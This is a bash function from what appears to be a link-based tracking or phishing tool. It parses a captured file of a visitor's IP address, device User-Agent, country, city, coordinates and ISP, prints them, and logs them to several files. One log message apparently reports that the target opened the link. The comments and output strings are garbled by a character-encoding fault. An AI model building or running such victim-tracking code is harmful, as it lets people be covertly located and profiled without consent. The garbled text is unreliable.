catch_ip() {
    # –ò–∑–≤–ª–µ–∫–∞–µ–º IP –∞–¥—Ä–µ—Å –∏–∑ —Ñ–∞–π–ª–∞ ip.txt (–∏—â–µ–º —Å—Ç—Ä–æ–∫—É —Å "IP:" –∏ –±–µ—Ä–µ–º –≤—Ç–æ—Ä–æ–µ –ø–æ–ª–µ)
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
    # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ä–∞–∑–¥–µ–ª–∏—Ç–µ–ª—å –ø–æ–ª–µ–π –Ω–∞ –Ω–æ–≤—É—é —Å—Ç—Ä–æ–∫—É
IFS=$'\n'
    # –ü–æ–ª—É—á–∞–µ–º User-Agent –∏–∑ —Ñ–∞–π–ª–∞ ip.txt
    user_agent=$(grep -a 'User-Agent:' ip.txt | cut -d ":" -f2- | tr -d '\r')
    # –ü–æ–ª—É—á–∞–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é –∏–∑ —Ñ–∞–π–ª–∞ ip.txt
    country=$(grep -a 'Country:' ip.txt | cut -d ":" -f2- | tr -d '\r' | sed 's/^[[:space:]]*//')
    city=$(grep -a 'City:' ip.txt | cut -d ":" -f2- | tr -d '\r' | sed 's/^[[:space:]]*//')
    region=$(grep -a 'Region:' ip.txt | cut -d ":" -f2- | tr -d '\r' | sed 's/^[[:space:]]*//')
    lat=$(grep -a 'Latitude:' ip.txt | cut -d ":" -f2- | tr -d '\r' | sed 's/^[[:space:]]*//')
    lon=$(grep -a 'Longitude:' ip.txt | cut -d ":" -f2- | tr -d '\r' | sed 's/^[[:space:]]*//')
    isp=$(grep -a 'ISP:' ip.txt | cut -d ":" -f2- | tr -d '\r' | sed 's/^[[:space:]]*//')
    # –í—ã–≤–æ–¥–∏–º –Ω–∞–π–¥–µ–Ω–Ω—ã–π IP –∞–¥—Ä–µ—Å (–∂–µ–ª—Ç—ã–π —Ü–≤–µ—Ç)
    printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" "$ip"
    # –í—ã–≤–æ–¥–∏–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ (–µ—Å–ª–∏ –µ—Å—Ç—å)
    if [[ -n "$user_agent" ]]; then
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ:\e[0m\e[1;77m %s\e[0m\n" "$user_agent"
    fi
    # –í—ã–≤–æ–¥–∏–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é (–µ—Å–ª–∏ –µ—Å—Ç—å)
    if [[ -n "$country" && "$country" != "Unknown" && "$country" != "Local" ]]; then
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] –ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:\e[0m\e[1;77m %s, %s, %s\e[0m\n" "$country" "$region" "$city"
        if [[ -n "$lat" && "$lat" != "0" ]]; then
            printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã:\e[0m\e[1;77m %s, %s\e[0m\n" "$lat" "$lon"
        fi
    fi
    if [[ -n "$isp" && "$isp" != "Unknown" ]]; then
        printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] ISP:\e[0m\e[1;77m %s\e[0m\n" "$isp"
    fi
    # –î–æ–±–∞–≤–ª—è–µ–º —Å–æ–¥–µ—Ä–∂–∏–º–æ–µ ip.txt –≤ –∫–æ–Ω–µ—Ü —Ñ–∞–π–ª–∞ saved.ip.txt
cat ip.txt >> saved.ip.txt
    # –î–æ–±–∞–≤–ª—è–µ–º –∑–∞–ø–∏—Å—å –≤ –ª–æ–≥ —Å –≤—Ä–µ–º–µ–Ω–Ω–æ–π –º–µ—Ç–∫–æ–π –∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–µ–π
    local geo_info=""
    if [[ -n "$country" && "$country" != "Unknown" && "$country" != "Local" ]]; then
        geo_info=" | Location: $country, $city | Coordinates: $lat, $lon"
    fi
    echo "[$(date +%Y-%m-%d\ %H:%M:%S)] IP: $ip | User-Agent: $user_agent$geo_info" >> activity.log
    
    # –ó–∞–ø–∏—Å—ã–≤–∞–µ–º –¥–∞–Ω–Ω—ã–µ –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏ –≤ –ª–æ–≥ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –¥–ª—è –æ—Ç–æ–±—Ä–∞–∂–µ–Ω–∏—è –≤ —Ç–µ—Ä–º–∏–Ω–∞–ª–µ
    echo "[$(date +%Y-%m-%d\ %H:%M:%S)] [+] –¶–µ–ª—å –æ—Ç–∫—Ä—ã–ª–∞ —Å—Å—ã–ª–∫—É!" >> logs_location.log
    echo "[$(date +%Y-%m-%d\ %H:%M:%S)] [+] IP: $ip" >> logs_location.log
    if [[ -n "$user_agent" ]]; then
        echo "[$(date +%Y-%m-%d\ %H:%M:%S)] [+] –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: $user_agent" >> logs_location.log
    fi
    if [[ -n "$country" && "$country" != "Unknown" && "$country" != "Local" ]]; then
        echo "[$(date +%Y-%m-%d\ %H:%M:%S)] [+] –ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ: $country, $region, $city" >> logs_location.log
        if [[ -n "$lat" && "$lat" != "0" ]]; then
            echo "[$(date +%Y-%m-%d\ %H:%M:%S)] [+] –ö–æ–æ—Ä–¥–∏–Ω–∞—Ç—ã: $lat, $lon" >> logs_location.log
        fi
    fi
    if [[ -n "$isp" && "$isp" != "Unknown" ]]; then
        echo "[$(date +%Y-%m-%d\ %H:%M:%S)] [+] ISP: $isp" >> logs_location.log
    fi
    echo "[$(date +%Y-%m-%d\ %H:%M:%S)] ---" >> logs_location.log
}

